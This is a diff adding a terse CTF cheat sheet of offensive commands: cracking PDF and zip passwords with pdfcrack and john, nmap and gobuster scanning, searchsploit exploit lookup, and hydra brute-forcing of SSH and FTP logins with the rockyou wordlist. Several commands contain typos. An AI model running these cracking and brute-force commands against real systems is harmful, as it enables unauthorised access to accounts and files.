@@ -1,0 +1,22 @@
+PDF CRACKING
+------------
+sudo pdfcrack -f SC2.pdf /usr/share/wordlists/rockyou.txt
+		OR
+rm hash.txt, pdf2john sc1.pdf > hash.txt
+cat hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+		OR
+zip change only zip2john filename >hash
+
+CTF CRACKING USING HYDRA COMMANDS
+---------------------------------
+Ctf namp -p- -T4 -V (target IP)
+http:ip/robots.txt
+gobuster dir -u http:/ip/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+searchsploit
+searchsploit -m filename
+(python2/3 version) -w filename.py
+pip3 install requests termcolor
+python3 filename.py -u fullipfrombrower –crack -w /usr/share/wordlists/rockyou.txt
+hydra -l user -P rockyou.txt, ssh://IP
+hydra -l admin -P rockyou.txt ftp://IP
